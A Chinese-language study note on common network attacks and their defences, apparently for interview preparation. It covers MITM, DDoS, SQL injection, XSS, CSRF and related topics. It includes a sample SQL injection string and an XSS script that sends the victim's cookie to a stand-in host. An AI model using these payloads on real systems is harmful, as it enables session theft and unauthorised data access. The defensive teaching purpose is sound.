---
title: 常见网络攻击
---

# 常见网络攻击

<div class="nt-badge nt-badge-security">网络安全</div>
<div class="nt-badge nt-badge-interview">高频</div>

本章梳理常见网络攻击手法与防御措施，是安全工程师与后端开发的必备知识。

## 1. 攻击分类

| 维度 | 类别 |
| --- | --- |
| 被动 | 窃听、嗅探 |
| 主动 | 篡改、伪造、重放 |
| 拒绝服务 | DoS / DDoS / 资源耗尽 |
| 中间人 | MITM、ARP 欺骗、DNS 劫持 |
| 注入 | SQL 注入、XSS、命令注入 |
| 社会工程 | 钓鱼、APT |

## 2. 嗅探与窃听

- **原理**：共享信道抓包（Hub / WiFi）
- **防御**：HTTPS、SSH、VPN、WPA3

## 3. 中间人攻击（MITM）

| 攻击 | 原理 | 防御 |
| --- | --- | --- |
| ARP 欺骗 | 伪造 IP-MAC | 静态 ARP、DAI |
| DNS 劫持 | 篡改 DNS 响应 | DNSSEC、DoH |
| HTTPS 中间人 | 客户端安装恶意 CA | 严格 CA 信任库 |
| WiFi 仿冒 | 假 AP 抓包 | WPA3、证书校验 |

## 4. DoS / DDoS

### 4.1 分类

| 类型 | 攻击 |
| --- | --- |
| 带宽耗尽 | UDP Flood、ICMP Flood |
| 资源耗尽 | SYN Flood、HTTP Flood |
| 应用层 | Slowloris、CC（Challenge Collapsar） |
| 协议 | Ping of Death、Smurf |
| 反射放大 | DNS Amp、NTP Amp、Memcached |

### 4.2 防御

| 措施 | 层级 |
| --- | --- |
| 流量清洗 | 运营商 / CDN |
| Anycast 分散 | 网络层 |
| 限速 / 黑洞 | 路由 |
| 验证码 | 应用层 |
| 协议栈加固 | 内核（SYN Cookies） |
| WAF | 应用层 |

## 5. SYN Flood

- 半连接队列打满
- 防御：SYN Cookies、`tcp_max_syn_backlog`

## 6. 缓冲区溢出

- 攻击者向程序输入超长数据，覆盖返回地址
- 防御：边界检查、ASLR、DEP、Stack Canary、CSP

## 7. SQL 注入

```sql
-- 攻击
SELECT * FROM users WHERE name = '' OR '1'='1' --'
```

| 防御 | 做法 |
| --- | --- |
| 参数化查询 | 关键 |
| ORM | 框架级 |
| 输入校验 | 辅助 |
| 最小权限 | 数据库账户 |
| WAF | 兜底 |

## 8. XSS（Cross-Site Scripting）

```html
<script>document.location='http://evil/?c='+document.cookie</script>
```

| 类型 | 触发 |
| --- | --- |
| 反射型 | URL 参数注入 |
| 存储型 | DB 注入 |
| DOM 型 | JS 操作 DOM |

| 防御 | 做法 |
| --- | --- |
| 输出编码 | HTML / JS / URL |
| CSP | Content-Security-Policy |
| HttpOnly Cookie | 防偷 |
| 输入校验 | 辅助 |

## 9. CSRF（Cross-Site Request Forgery）

| 防御 | 做法 |
| --- | --- |
| SameSite Cookie | 推荐 |
| CSRF Token | 传统 |
| Referer / Origin 校验 | 辅助 |
| 双重 Cookie | 部分场景 |

## 10. 重放攻击

- 攻击者抓包后重发
- 防御：
  - 时间戳 + nonce
  - 一次性 token
  - 序列号
  - TLS 1.3 0-RTT 需业务防重放

## 11. 暴力破解

- 弱口令、SSHD、SSH、RDP
- 防御：复杂密码、fail2ban、多因子认证、限速

## 12. 协议层攻击

| 协议 | 攻击 |
| --- | --- |
| ARP | ARP 欺骗 |
| DHCP | DHCP 欺骗 / 饥饿 |
| DNS | 缓存投毒、劫持 |
| BGP | BGP Hijack（前缀劫持） |
| ICMP | Smurf、Ping of Death |
| IP | IP 欺骗 |

## 13. 应用层攻击

- 撞库（Credential Stuffing）
- 抓包改包
- 爬虫 / 薅羊毛
- API 滥用

## 14. 零日漏洞（0day）

- 未公开漏洞
- 防御：纵深防御、行为检测、威胁情报、快速补丁

## 15. 加密攻击

| 攻击 | 说明 |
| --- | --- |
| 中间人 | 替换证书 |
| 降级 | 强制用弱协议 |
| 侧信道 | 时间、功耗推断密钥 |
| 填充预言 | SSL Padding Oracle |
| BEAST / POODLE | 旧 TLS 漏洞 |
| Heartbleed | OpenSSL 漏洞 |

## 16. APT（高级持续威胁）

- 长期潜伏、针对性攻击
- 攻击链：侦察 → 武器化 → 投递 → 利用 → 安装 → C&C → 行动
- 防御：EDR、SIEM、威胁情报、零信任

## 17. 防御体系

| 层级 | 措施 |
| --- | --- |
| 网络 | 防火墙、IDS/IPS、ACL |
| 主机 | 杀毒、补丁、HIDS |
| 应用 | WAF、RASP、输入校验 |
| 数据 | 加密、脱敏、备份 |
| 身份 | MFA、零信任、IAM |
| 运营 | 漏洞扫描、渗透测试、应急响应 |

## 18. 常见面试题

1. **XSS 类型？** 反射型、存储型、DOM 型。
2. **CSRF 怎么防？** SameSite、Token、Referer。
3. **DDoS 怎么防？** 流量清洗、Anycast、限速、验证码。
4. **SQL 注入如何防？** 参数化查询。
5. **HTTPS 防中间人原理？** CA 证书链。
6. **零信任核心？** 永不信任，持续验证，最小权限。
